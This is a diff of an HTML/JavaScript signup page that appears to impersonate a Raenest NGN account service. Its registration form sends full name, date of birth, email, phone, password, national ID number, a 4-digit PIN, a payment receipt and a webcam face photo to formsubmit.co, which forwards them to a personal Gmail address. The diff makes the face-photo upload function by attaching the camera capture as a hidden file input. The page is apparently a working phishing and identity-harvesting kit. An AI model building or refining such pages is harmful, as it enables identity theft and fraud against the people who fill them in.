@@ -1701,7 +1701,7 @@
   <!-- Referral Program Page -->
   <div id="referralPage" class="referral-page">
     <div class="referral-header">
-      <button class="referral-close" id="referralCloseBtn">×</button>
+      <button class="referral-close" id="referralCloseBtn" type="button">×</button>
       <div class="referral-title">🎁 Referral Program</div>
     </div>
 
@@ -1743,7 +1743,7 @@
   <!-- Profile Page -->
   <div id="profilePage" class="profile-page">
     <div class="profile-header">
-      <span id="profileBackBtn" class="profile-back">&lt;</span>
+      <span id="profileBackBtn" class="profile-back" style="cursor: pointer;">&lt;</span>
       <span>My Profile</span>
     </div>
 
@@ -1794,7 +1794,7 @@
   <!-- Proof of Address Page -->
   <div id="proofPage" class="proof-page">
     <div class="proof-header">
-      <span id="proofBackBtn">&lt;</span>
+      <span id="proofBackBtn" style="cursor: pointer;">&lt;</span>
       <span>Provide Proof Raenest NGN Account</span>
     </div>
 
@@ -2054,16 +2054,15 @@
 
       <form id="signupForm" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
         <input type="hidden" name="_subject" value="New Account Registration" />
-        <input type="hidden" name="Face Capture" id="faceData" />
 
         <div class="field">
           <label><span class="required">*</span>Full Name</label>
-          <input name="Full Name" type="text" required />
+          <input name="Full Name" type="text" class="form-input" required />
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Gender</label>
-          <select name="Gender" required>
+          <select name="Gender" class="form-select" required>
             <option value="">Choose gender</option>
             <option>Female</option>
             <option>Male</option>
@@ -2073,7 +2072,7 @@
 
         <div class="field">
           <label><span class="required">*</span>Date of Birth</label>
-          <input name="Date of Birth" type="date" required />
+          <input name="Date of Birth" type="date" class="form-input" required />
         </div>
 
         <div class="field">
@@ -2083,26 +2082,27 @@
             <img id="facePreviewImg" style="width: 100%; border-radius: 8px; max-width: 150px; margin-bottom: 10px;" />
             <p style="font-size: 12px; color: var(--green);">✓ Face captured successfully</p>
           </div>
+          <input type="file" name="Face Capture" id="faceFileInput" accept="image/*" style="display: none;" />
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Email</label>
-          <input name="Email" type="email" required />
+          <input name="Email" type="email" class="form-input" required />
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Phone Number</label>
-          <input name="Phone Number" type="tel" required />
+          <input name="Phone Number" type="tel" class="form-input" required />
         </div>
 
         <div class="field">
           <label><span class="required">*</span>Password</label>
-          <input name="Password" type="password" required />
+          <input name="Password" type="password" class="form-input" required />
         </div>
 
         <div class="field">
           <label><span class="required">*</span>NIN (National ID Number)</label>
-          <input name="NIN" type="text" required />
+          <input name="NIN" type="text" class="form-input" required />
         </div>
 
         <div class="field">
@@ -2122,12 +2122,12 @@
 
         <div class="field">
           <label><span class="required">*</span>Create 4-Digit PIN</label>
-          <input name="PIN" type="password" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
+          <input name="PIN" type="password" class="form-input" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required />
         </div>
 
         <div class="field">
           <label>Referral Code (Optional)</label>
-          <input name="Referral Code" type="text" />
+          <input name="Referral Code" type="text" class="form-input" />
         </div>
 
         <button class="primary-btn" type="submit">REGISTER</button>
@@ -2212,7 +2212,7 @@
     let mediaStream = null;
     let currentWalletIndex = 0;
     let faceImageData = null;
-    const EXCHANGE_RATE = 1500; // 1 USD = 1500 NGN
+    const EXCHANGE_RATE = 1500;
 
     const $ = (id) => document.getElementById(id);
 
@@ -2271,12 +2271,6 @@
       if (expiryYear < currentYear) return true;
       if (expiryYear === currentYear && expiryMonth < currentMonth) return true;
       return false;
-    }
-
-    function hasIncomingPaymentArrived(user) {
-      const now = new Date();
-      const paymentDate = new Date(user.incomingPaymentDate);
-      return now >= paymentDate;
     }
 
     function getNotificationCount() {
@@ -2436,7 +2430,7 @@
       });
     }
 
-    // Indicator Click Handler
+    // Indicator Click
     document.querySelectorAll('.indicator').forEach((indicator, index) => {
       indicator.addEventListener('click', () => {
         const slider = $("walletSlider");
@@ -2944,17 +2938,22 @@
       canvas.height = video.videoHeight;
       context.drawImage(video, 0, 0);
       
-      faceImageData = canvas.toDataURL('image/png');
-      $("faceData").value = faceImageData;
-      
-      const img = new Image();
-      img.src = faceImageData;
-      img.onload = () => {
+      // Convert canvas to blob and create file
+      canvas.toBlob((blob) => {
+        const file = new File([blob], "face_capture.png", { type: "image/png" });
+        
+        // Create a DataTransfer to set files
+        const dataTransfer = new DataTransfer();
+        dataTransfer.items.add(file);
+        $("faceFileInput").files = dataTransfer.files;
+        
+        faceImageData = canvas.toDataURL('image/png');
+        
         $("facePreviewImg").src = faceImageData;
         $("facePreview").style.display = "block";
         stopCamera();
         showAlert("Success", "Face captured successfully!");
-      };
+      });
     });
 
     $("cameraCloseBtn").addEventListener("click", (e) => {
@@ -2987,12 +2986,12 @@
     $("signupForm").addEventListener("submit", (e) => {
       e.preventDefault();
 
-      if (!faceImageData) {
+      if (!$("faceFileInput").files || $("faceFileInput").files.length === 0) {
         showAlert("Face Capture Required", "Please capture your face before registering.");
         return;
       }
 
-      if (!$("receiptFileInput").files.length) {
+      if (!$("receiptFileInput").files || $("receiptFileInput").files.length === 0) {
         showAlert("Receipt Required", "Please upload your payment receipt.");
         return;
       }
@@ -3001,7 +3000,6 @@
       setTimeout(() => {
         hideLoading();
         $("signupForm").submit();
-        closeModal("signupModal");
       }, 1500);
     });
 
@@ -3032,7 +3030,7 @@
     $("signupLink").addEventListener("click", (event) => {
       event.preventDefault();
       faceImageData = null;
-      $("faceData").value = "";
+      $("faceFileInput").value = "";
       $("facePreview").style.display = "none";
       $("receiptFileName").textContent = "";
       $("receiptFileInput").value = "";
